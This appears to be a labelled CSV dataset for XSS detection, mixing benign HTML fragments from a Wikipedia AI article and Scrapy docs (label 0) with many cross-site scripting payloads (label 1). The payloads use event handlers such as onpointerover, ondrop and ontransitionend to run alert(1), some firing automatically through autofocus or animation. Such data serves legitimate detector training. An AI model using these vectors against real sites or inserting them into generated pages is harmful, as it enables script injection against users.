,Sentence,Label
7042,"	 </span><span style=""display: inline-block; margin-left: 4px; width: 182px; vertical-align: middle;""><a href=""https://en.wikiversity.org/wiki/Portal:Artificial_intelligence"" class=""extiw"" title=""v:Portal:Artificial intelligence"">Resources </a> from Wikiversity ",0
7043,"	 </span> <span class=""reference-text""><cite class=""citation news"">Borowiec, Tracey Lien, Steven (2016). <a rel=""nofollow"" class=""external text"" href=""https://www.latimes.com/world/asia/la-fg-korea-alphago-20160312-story.html"">""AlphaGo beats human Go champ in milestone for artificial intelligence"" </a>. <i>latimes.com </i><span class=""reference-accessdate"">. Retrieved <span class=""nowrap"">7 May ",0
7044,</div>,0
7045,	 </span>,0
7046,<sup id=x tabindex=1 onbeforedeactivate=alert(1)></sup><input autofocus>,1
7047,"<plaintext onbeforecopy=""alert(1)"" contenteditable>test</plaintext>",1
7048,"<li><a href=""/wiki/Cross-validation_(statistics)"" title=""Cross-validation (statistics)"">Cross-validation </a> </li> </ul>",0
7049, ,0
7050,"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> </li>",0
7051,"<ins onclick=""alert(1)"">test</ins>",1
7052,"	 </span> <span class=""reference-text""><cite class=""citation news"">Holley, Peter (28 January 2015). <a rel=""nofollow"" class=""external text"" href=""https://www.washingtonpost.com/news/the-switch/wp/2015/01/28/bill-gates-on-dangers-of-artificial-intelligence-dont-understand-why-some-people-are-not-concerned/"">""Bill Gates on dangers of artificial intelligence: 'I don't understand why some people are not concerned<span class=""cs1-kern-right"">' ",0
7053,"<html oncopy=""alert(1)"" contenteditable>test</html>",1
7054,<center id=x tabindex=1 onbeforedeactivate=alert(1)></center><input autofocus>,1
7055,<embed onpointerout=alert(1)>XSS</embed>,1
7056,"<style>@keyframes slidein {}</style><image style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></image>",1
7057,<dfn onpointerout=alert(1)>XSS</dfn>,1
7058,"<isindex onmouseover=""alert(1)"">test</isindex>",1
7059,"	 </span> <span class=""reference-text""><cite class=""citation web""><a rel=""nofollow"" class=""external text"" href=""http://www.igmchicago.org/surveys/robots-and-artificial-intelligence"">""Robots and Artificial Intelligence"" </a>. <i>www.igmchicago.org </i><span class=""reference-accessdate"">. Retrieved <span class=""nowrap"">3 July ",0
7060,"<li><a href=""/wiki/Henri_Poincar%C3%A9"" title=""Henri Poincaré"">Henri Poincaré </a> </li>",0
7061,"<div draggable=""true"" contenteditable>drag me</div><frame ondrop=alert(1) contenteditable>drop here</frame>",1
7062,"	 </span> <span class=""toctext"">Art ",0
7063,	 </span> </li>,0
7064,"<datalist onkeydown=""alert(1)"" contenteditable>test</datalist>",1
7065,"<embed draggable=""true"" ondragleave=""alert(1)"">test</embed>",1
7066,"<li><a href=""#CITEREFNewquist1994"">Newquist 1994 </a>, pp.&#160;235–248 </li> </ul>",0
7067,"	 </span> <span class=""reference-text"">",0
7068,"<listing oncopy=""alert(1)"" contenteditable>test</listing>",1
7069, ,0
7070,"<style>@keyframes x{}</style><dfn style=""animation-name:x"" onanimationstart=""alert(1)""></dfn>",1
7071,"<ul><li><a href=""#CITEREFMcCorduck2004"">McCorduck 2004 </a>, pp.&#160;111–136 </li>",0
7072,"Researchers in the 1960s and the 1970s were convinced that symbolic approaches would eventually succeed in creating a machine with <a href=""/wiki/Artificial_general_intelligence"" title=""Artificial general intelligence"">artificial general intelligence </a> and considered this the goal of their field.",0
7073,"<data oncontextmenu=""alert(1)"">test</data>",1
7074,"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> ",0
7075, ,0
7076,"<noscript onmousedown=""alert(1)"">test</noscript>",1
7077,<blink id=x tabindex=1 onbeforedeactivate=alert(1)></blink><input autofocus>,1
7078,"<li><a href=""#CITEREFPooleMackworthGoebel1998"">Poole, Mackworth &amp; Goebel 1998 </a>, pp.&#160;281–298, </li>",0
7079,"<li><a href=""#CITEREFRussellNorvig2003"">Russell &amp; Norvig 2003 </a>, p.&#160;963 </li> </ul>",0
7080,"<frameset onbeforepaste=""alert(1)"" contenteditable>test</frameset>",1
7081,"<style>:target {transform: rotate(180deg);}</style><q id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></q>",1
7082,"<cite draggable=""true"" ondragstart=""alert(1)"">test</cite>",1
7083,"	 </span> <span class=""reference-text""><cite class=""citation news"">Brown, Noam; Sandholm, Tuomas (26 January 2018). <a rel=""nofollow"" class=""external text"" href=""http://science.sciencemag.org/content/359/6374/418"">""Superhuman AI for heads-up no-limit poker: Libratus beats top professionals"" </a>. <i>Science </i>. pp.&#160;418–424. <a href=""/wiki/Digital_object_identifier"" title=""Digital object identifier"">doi </a>:<a rel=""nofollow"" class=""external text"" href=""https://doi.org/10.1126%2Fscience.aao1733"">10.1126/science.aao1733 </a><span class=""reference-accessdate"">. Retrieved <span class=""nowrap"">7 May ",0
7084,"<meta name=""referrer"" content=""origin""/>",0
7085,<base onpointerover=alert(1)>XSS</base>,1
7086,"<p>In his book <i><a href=""/wiki/Superintelligence:_Paths,_Dangers,_Strategies"" title=""Superintelligence: Paths, Dangers, Strategies"">Superintelligence </a> </i>, philosopher <a href=""/wiki/Nick_Bostrom"" title=""Nick Bostrom"">Nick Bostrom </a> provides an argument that artificial intelligence will pose a threat to humankind. He argues that sufficiently intelligent AI, if it chooses actions based on achieving some goal, will exhibit <a href=""/wiki/Instrumental_convergence"" title=""Instrumental convergence"">convergent </a> behavior such as acquiring resources or protecting itself from being shut down. If this AI's goals do not fully reflect humanity's—one example is an AI told to compute as many digits of pi as possible—it might harm humanity in order to acquire more resources or prevent itself from being shut down, ultimately to better achieve its goal.  Bostrom also emphasizes the difficulty of fully conveying humanity's values to an advanced AI.  He uses the hypothetical example of giving an AI the goal to make humans smile to illustrate a misguided attempt.  If the AI in that scenario were to become superintelligent, Bostrom argues, it may resort to methods that most humans would find horrifying, such as inserting ""electrodes into the facial muscles of humans to cause constant, beaming grins"" because that would be an efficient way to achieve its goal of making humans smile.<sup id=""cite_ref-368"" class=""reference""><a href=""#cite_note-368"">&#91;357&#93; </a> </sup>  In his book <i><a href=""/wiki/Human_Compatible"" title=""Human Compatible"">Human Compatible </a> </i>, AI researcher <a href=""/wiki/Stuart_J._Russell"" title=""Stuart J. Russell"">Stuart J. Russell </a> echoes some of Bostrom's concerns while also proposing <a href=""/wiki/Human_Compatible#Russell&#39;s_three_principles"" title=""Human Compatible"">an approach </a> to developing provably beneficial machines focused on uncertainty and deference to humans,<sup id=""cite_ref-HC_369-0"" class=""reference""><a href=""#cite_note-HC-369"">&#91;358&#93; </a> </sup><sup class=""reference"" style=""white-space:nowrap;"">:<span>173 ",0
7087,"<style>:target {transform: rotate(180deg);}</style><xss id=x style=""transition:transform 10s"" ontransitioncancel=alert(1)></xss>",1
7088,"<div draggable=""true"" contenteditable>drag me</div><meter ondragover=alert(1) contenteditable>drop here</meter>",1
7089,"<ul><li><cite class=""citation encyclopaedia""><a rel=""nofollow"" class=""external text"" href=""http://www.iep.utm.edu/art-inte"">""Artificial Intelligence"" </a>. <i><a href=""/wiki/Internet_Encyclopedia_of_Philosophy"" title=""Internet Encyclopedia of Philosophy"">Internet Encyclopedia of Philosophy </a> </i>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=bookitem&amp;rft.atitle=Artificial+Intelligence&amp;rft.btitle=Internet+Encyclopedia+of+Philosophy&amp;rft_id=http%3A%2F%2Fwww.iep.utm.edu%2Fart-inte&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0
7090,"<param ondblclick=""alert(1)"">test</param>",1
7091,<image2 onpointerover=alert(1)>XSS</image2>,1
7092," </div> </td> </tr><tr><th scope=""row"" class=""navbox-group"" style=""width:1%""><a href=""/wiki/Human%E2%80%93computer_interaction"" title=""Human–computer interaction"">Human–computer<br />interaction </a> </th><td class=""navbox-list navbox-even"" style=""text-align:left;border-left-width:2px;border-left-style:solid;width:100%;padding:0px"">",0
7093,"<td ondblclick=""alert(1)"">test</td>",1
7094,"	 </span> <span class=""toctext"">Definitions ",0
7095,"<h3><span class=""mw-headline"" id=""Audit"">Audit ",0
7096,<isindex id=x tabindex=1 onbeforeactivate=alert(1)></isindex>,1
7097,"<ul><li><a href=""#CITEREFRussellNorvig2003"">Russell &amp; Norvig 2003 </a>, pp.&#160;613–631 </li> </ul>",0
7098,	 </span> </h3>,0
7099,	 </span>,0
7100,"<li><a href=""/wiki/Fallibilism"" title=""Fallibilism"">Fallibilism </a> </li>",0
7101,"<button draggable=""true"" ondragend=""alert(1)"">test</button>",1
7102,<ruby id=x tabindex=1 onactivate=alert(1)></ruby>,1
7103,	 </span> </h3>,0
7104,"<div draggable=""true"" contenteditable>drag me</div><video ondrop=alert(1) contenteditable>drop here</video>",1
7105,"	<div class=""portal"" role=""navigation"" id=""p-wikibase-otherprojects""  aria-labelledby=""p-wikibase-otherprojects-label"">",0
7106,<del onpointerup=alert(1)>XSS</del>,1
7107,"<element onkeypress=""alert(1)"" contenteditable>test</element>",1
7108,"	 </span></a></dt><dd>Learn how to configure Scrapy and see all <a class=""hoverxref reference internal"" data-doc=""topics/settings"" data-project=""scrapy"" data-section=""topics-settings-ref"" data-version=""latest"" href=""topics/settings.html#topics-settings-ref""><span class=""std std-ref"">available settings",0
7109, ,0
7110,document.write(),1
7111," </p><p>Within <a href=""/wiki/Developmental_robotics"" title=""Developmental robotics"">developmental robotics </a>, developmental learning approaches are elaborated upon to allow robots to accumulate repertoires of novel skills through autonomous self-exploration, social interaction with human teachers, and the use of guidance mechanisms (active learning, maturation, motor synergies, etc.).<sup id=""cite_ref-FOOTNOTEWengMcClellandPentlandSporns2001_168-0"" class=""reference""><a href=""#cite_note-FOOTNOTEWengMcClellandPentlandSporns2001-168"">&#91;165&#93; </a> </sup><sup id=""cite_ref-FOOTNOTELungarellaMettaPfeiferSandini2003_169-0"" class=""reference""><a href=""#cite_note-FOOTNOTELungarellaMettaPfeiferSandini2003-169"">&#91;166&#93; </a> </sup><sup id=""cite_ref-FOOTNOTEAsadaHosodaKuniyoshiIshiguro2009_170-0"" class=""reference""><a href=""#cite_note-FOOTNOTEAsadaHosodaKuniyoshiIshiguro2009-170"">&#91;167&#93; </a> </sup><sup id=""cite_ref-FOOTNOTEOudeyer2010_171-0"" class=""reference""><a href=""#cite_note-FOOTNOTEOudeyer2010-171"">&#91;168&#93; </a> </sup>",0
7112,"<nextid onmouseout=""alert(1)"">test</nextid>",1
7113,"		<li id=""footer-poweredbyico""><a href=""https://www.mediawiki.org/""><img src=""/static/images/poweredby_mediawiki_88x31.png"" alt=""Powered by MediaWiki"" srcset=""/static/images/poweredby_mediawiki_132x47.png 1.5x, /static/images/poweredby_mediawiki_176x62.png 2x"" width=""88"" height=""31""/> </a> </li>",0
7114,"	 </span> <span class=""reference-text""><cite class=""citation web"">at 10:11, Alistair Dabbs 22 Feb 2019. <a rel=""nofollow"" class=""external text"" href=""https://www.theregister.co.uk/2019/02/22/artificial_intelligence_you_know_it_isnt_real_yeah/"">""Artificial Intelligence: You know it isn't real, yeah?"" </a>. <i>www.theregister.co.uk </i>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=unknown&amp;rft.jtitle=www.theregister.co.uk&amp;rft.atitle=Artificial+Intelligence%3A+You+know+it+isn%27t+real%2C+yeah%3F&amp;rft.aulast=at+10%3A11&amp;rft.aufirst=Alistair+Dabbs+22+Feb+2019&amp;rft_id=https%3A%2F%2Fwww.theregister.co.uk%2F2019%2F02%2F22%2Fartificial_intelligence_you_know_it_isnt_real_yeah%2F&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0
7115,"<div draggable=""true"" contenteditable>drag me</div><template ondragover=alert(1) contenteditable>drop here</template>",1
7116,"<ul><li><a href=""#CITEREFCrevier1993"">Crevier 1993 </a>, pp.&#160;115–117 </li>",0
7117,<head onpointerover=alert(1)>XSS</head>,1
7118,"<svg onmouseleave=""alert(1)"">test</svg>",1
7119," </div> </td> </tr><tr><th scope=""row"" class=""navbox-group"" style=""width:1%""><a href=""/wiki/Human%E2%80%93computer_interaction"" title=""Human–computer interaction"">Human–computer<br />interaction </a> </th><td class=""navbox-list navbox-even"" style=""text-align:left;border-left-width:2px;border-left-style:solid;width:100%;padding:0px"">",0
7120,"<ul><li><a href=""#CITEREFACM1998"">ACM 1998 </a>, I.2.10 </li>",0
7121,<ins id=x tabindex=1 onfocus=alert(1)></ins>,1
7122,"<rtc onmouseover=""alert(1)"">test</rtc>",1
7123,<p onpointerup=alert(1)>XSS</p>,1
7124,<tr onpointerover=alert(1)>XSS</tr>,1
7125, </p>,0
7126,<acronym onfocusout=alert(1) tabindex=1 id=x></acronym><input autofocus>,1
7127,<shadow id=x tabindex=1 onfocus=alert(1)></shadow>,1
7128,"<style>:target {transform: rotate(180deg);}</style><button id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></button>",1
7129,"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> ",0
7130,	 </span> 2016 ,0
7131,"<title onmousemove=""alert(1)"">test</title>",1
7132,	 </span>,0
7133,"	 </span> <span class=""reference-text""><cite class=""citation web""><a rel=""nofollow"" class=""external text"" href=""https://joshworth.com/stop-calling-in-artificial-intelligence/"">""Stop Calling it Artificial Intelligence"" </a>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=unknown&amp;rft.btitle=Stop+Calling+it+Artificial+Intelligence&amp;rft_id=https%3A%2F%2Fjoshworth.com%2Fstop-calling-in-artificial-intelligence%2F&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0
7134,"	 </span>"" </a>. <i>BBC News </i>. <a rel=""nofollow"" class=""external text"" href=""https://web.archive.org/web/20170126133849/http://www.bbc.co.uk/news/health-38717928"">Archived </a> from the original on 26 January 2017<span class=""reference-accessdate"">. Retrieved <span class=""nowrap"">26 January ",0
7135,"<var onpaste=""alert(1)"" contenteditable>test</var>",1
7136,"<command ondblclick=""alert(1)"">test</command>",1
7137,"	 </span> <span class=""reference-text"">",0
7138, </li>,0
7139,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><nav id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></nav>",1
7140,<title onpointerleave=alert(1)>XSS</title>,1
7141, ,0
7142,"<div draggable=""true"" contenteditable>drag me</div><title ondragover=alert(1) contenteditable>drop here</title>",1
7143,"<li><a href=""#CITEREFLugerStubblefield2004"">Luger &amp; Stubblefield 2004 </a> </li>",0
7144,"	 <div style=""padding:0em 0.25em"">",0
7145,<svg><span onload=alert(1)></span>,1
7146,"<li><a href=""#CITEREFPooleMackworthGoebel1998"">Poole, Mackworth &amp; Goebel 1998 </a>, pp.&#160;397–438, </li>",0
7147,<bdo onpointerup=alert(1)>XSS</bdo>,1
7148,"<html class=""no-js"" lang=""en"" >",0
7149,<ul>,0
7150,<video onpointerover=alert(1)>XSS</video>,1
7151,"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> ",0
7152,	 </span> ,0
7153,<noembed onpointermove=alert(1)>XSS</noembed>,1
7154,"<element oncopy=""alert(1)"" contenteditable>test</element>",1
7155,"<li><a href=""/wiki/Competitions_and_prizes_in_artificial_intelligence"" title=""Competitions and prizes in artificial intelligence"">AI competitions </a> </li> </ul>",0
7156,"<li><a href=""#CITEREFPooleMackworthGoebel1998"">Poole, Mackworth &amp; Goebel 1998 </a>, pp.&#160;56–163 </li>",0
7157,<datalist onpointermove=alert(1)>XSS</datalist>,1
7158,	 </span> </li>,0
7159,<svg onpointerdown=alert(1)>XSS</svg>,1
7160,"<blink ondblclick=""alert(1)"">test</blink>",1
7161,"<dt><a class=""reference internal"" href=""topics/autothrottle.html""><span class=""doc"">AutoThrottle extension",0
7162,"<div class=""section"" id=""solving-specific-problems"">",0
7163,<figure onpointerenter=alert(1)>XSS</figure>,1
7164,"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> ",0
7165,"            <a href=""//readthedocs.org/builds/scrapy/?fromdocs=scrapy"">Builds</a>",0
7166,"<big onpaste=""alert(1)"" contenteditable>test</big>",1
7167,"<rp onkeyup=""alert(1)"" contenteditable>test</rp>",1
7168,"	<h3 id=""p-namespaces-label"">Namespaces </h3>",0
7169,"<li><a href=""/wiki/Bertrand_Russell"" title=""Bertrand Russell"">Bertrand Russell </a> </li>",0
7170,"	 </span><span class=""mw-editsection""><span class=""mw-editsection-bracket"">[ ",0
7171,	 </span>,0
7172,"<optgroup draggable=""true"" ondragend=""alert(1)"">test</optgroup>",1
7173, </div>,0
7174,"<style>:target {color:red;}</style><table id=x style=""transition:color 1s"" ontransitionend=alert(1)></table>",1
7175,<tfoot id=x tabindex=1 onbeforeactivate=alert(1)></tfoot>,1
7176,"<li><a href=""/wiki/Psychophysical_parallelism"" title=""Psychophysical parallelism"">Parallelism </a> </li>",0
7177, </li>,0
7178, </li>,0
7179,"<li id=""cite_note-Dreyfus&#39;_critique-355""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-Dreyfus&#39;_critique_355-0"">^ </a> </b> ",0
7180,	 </span>,0
7181,<xmp onblur=alert(1) tabindex=1 id=x></xmp><input autofocus>,1
7182,"<iframe onkeypress=""alert(1)"" contenteditable>test</iframe>",1
7183,"<div class=""section"" id=""built-in-services"">",0
7184,"<template onclick=""alert(1)"">test</template>",1
7185,"<output draggable=""true"" ondragstart=""alert(1)"">test</output>",1
7186,"<li id=""cite_note-AI_in_the_80s-10""><span class=""mw-cite-backlink"">^ <a href=""#cite_ref-AI_in_the_80s_10-0""><sup><i><b>a </b> </i> </sup> </a> <a href=""#cite_ref-AI_in_the_80s_10-1""><sup><i><b>b </b> </i> </sup> </a> <a href=""#cite_ref-AI_in_the_80s_10-2""><sup><i><b>c </b> </i> </sup> </a> ",0
7187, ,0
7188,<custom tags onpointerup=alert(1)>XSS</custom tags>,1
7189,"<noframes draggable=""true"" ondragstart=""alert(1)"">test</noframes>",1
7190,<nobr onpointerover=alert(1)>XSS</nobr>,1
7191,"<marquee onkeypress=""alert(1)"" contenteditable>test</marquee>",1
7192,<meter onpointerover=alert(1)>XSS</meter>,1
7193,"<frameset ondblclick=""alert(1)"">test</frameset>",1
7194,"<style>:target {transform: rotate(180deg);}</style><dl id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></dl>",1
7195,	 </span> </a>,0
7196,"<ul><li><a href=""/wiki/Accelerating_change"" title=""Accelerating change"">Accelerating change </a> </li>",0
7197,<bdo onpointerout=alert(1)>XSS</bdo>,1
7198,"<picture onmousemove=""alert(1)"">test</picture>",1
7199,"<progress oncopy=""alert(1)"" contenteditable>test</progress>",1
7200,"<frame onmouseenter=""alert(1)"">test</frame>",1
7201,"<li id=""cite_note-FOOTNOTEDomingos2015152-227""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-FOOTNOTEDomingos2015152_227-0"">^ </a> </b> ",0
7202,	 </span>,0
7203,"<li class=""toclevel-2 tocsection-43""><a href=""#Military""><span class=""tocnumber"">7.8 ",0
7204,<tr id=x tabindex=1 onbeforeactivate=alert(1)></tr>,1
7205,"<li><a href=""#CITEREFCrevier1993"">Crevier 1993 </a>, pp.&#160;113–114, </li>",0
7206,"<wbr onbeforecut=""alert(1)"" contenteditable>test</wbr>",1
7207,"	 </span><span class=""mw-editsection""><span class=""mw-editsection-bracket"">[ ",0
7208,      v: latest,0
7209,<i id=x tabindex=1 onbeforedeactivate=alert(1)></i><input autofocus>,1
7210,<dl id=x tabindex=1 onactivate=alert(1)></dl>,1
7211,"<li class=""toclevel-3 tocsection-54""><a href=""#Decrease_in_demand_for_human_labor""><span class=""tocnumber"">8.2.4 ",0
7212,"document.querySelector("""")",1
7213,"<li><a href=""#CITEREFLenatGuha1989"">Lenat &amp; Guha 1989 </a> (Introduction) </li> </ul>",0
7214,"<li id=""cite_note-Informed_search-189""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-Informed_search_189-0"">^ </a> </b> ",0
7215,<blink onpointerup=alert(1)>XSS</blink>,1
7216,"<li><a href=""#CITEREFNilsson1998"">Nilsson 1998 </a>, chpt. 18.3 </li> </ul>",0
7217,	 </span>,0
7218,<legend id=x tabindex=1 onactivate=alert(1)></legend>,1
7219,"<li><img alt=""Outline"" src=""//upload.wikimedia.org/wikipedia/commons/thumb/4/41/Global_thinking.svg/10px-Global_thinking.svg.png"" decoding=""async"" title=""Outline"" width=""10"" height=""16"" srcset=""//upload.wikimedia.org/wikipedia/commons/thumb/4/41/Global_thinking.svg/15px-Global_thinking.svg.png 1.5x, //upload.wikimedia.org/wikipedia/commons/thumb/4/41/Global_thinking.svg/21px-Global_thinking.svg.png 2x"" data-file-width=""130"" data-file-height=""200"" /> <b><a href=""/wiki/Outline_of_computer_science"" title=""Outline of computer science"">Outline </a> </b> </li>",0
7220,			In other projects,0
7221,"<li><a href=""/wiki/Health_informatics"" title=""Health informatics"">Computational healthcare </a> </li>",0
7222,"	 <div class=""plainlinks hlist navbar mini""><ul><li class=""nv-view""><a href=""/wiki/Template:Emerging_technologies_in_information_and_communications"" title=""Template:Emerging technologies in information and communications""><abbr title=""View this template"" style=""text-align: center;;;background:none transparent;border:none;-moz-box-shadow:none;-webkit-box-shadow:none;box-shadow:none; padding:0;"">v </abbr> </a> </li><li class=""nv-talk""><a href=""/wiki/Template_talk:Emerging_technologies_in_information_and_communications"" title=""Template talk:Emerging technologies in information and communications""><abbr title=""Discuss this template"" style=""text-align: center;;;background:none transparent;border:none;-moz-box-shadow:none;-webkit-box-shadow:none;box-shadow:none; padding:0;"">t </abbr> </a> </li><li class=""nv-edit""><a class=""external text"" href=""https://en.wikipedia.org/w/index.php?title=Template:Emerging_technologies_in_information_and_communications&amp;action=edit""><abbr title=""Edit this template"" style=""text-align: center;;;background:none transparent;border:none;-moz-box-shadow:none;-webkit-box-shadow:none;box-shadow:none; padding:0;"">e </abbr> </a> </li> </ul> </div>",0
7223,"<bdi oncontextmenu=""alert(1)"">test</bdi>",1
7224, </div> </td> </tr> </tbody> </table> </div>,0
7225,<legend id=x tabindex=1 onbeforedeactivate=alert(1)></legend><input autofocus>,1
7226,"	 </span><span class=""mw-editsection""><span class=""mw-editsection-bracket"">[ ",0
7227,<a id=x tabindex=1 onfocus=alert(1)></a>,1
7228,<progress onpointerover=alert(1)>XSS</progress>,1
7229,"<template onmousedown=""alert(1)"">test</template>",1
7230,"<style>:target {color: red;}</style><strike id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></strike>",1
7231,"<style>:target {color:red;}</style><canvas id=x style=""transition:color 1s"" ontransitionend=alert(1)></canvas>",1
7232,	 </span>,0
7233,<var onpointerover=alert(1)>XSS</var>,1
7234,"<li id=""cite_note-298""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-298"">^ </a> </b> ",0
7235,"<li id=""cite_note-376""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-376"">^ </a> </b> ",0
7236,"<div draggable=""true"" contenteditable>drag me</div><output ondrop=alert(1) contenteditable>drop here</output>",1
7237,<base id=x tabindex=1 onactivate=alert(1)></base>,1
7238,<q onpointermove=alert(1)>XSS</q>,1
7239,<bdi id=x tabindex=1 onbeforeactivate=alert(1)></bdi>,1
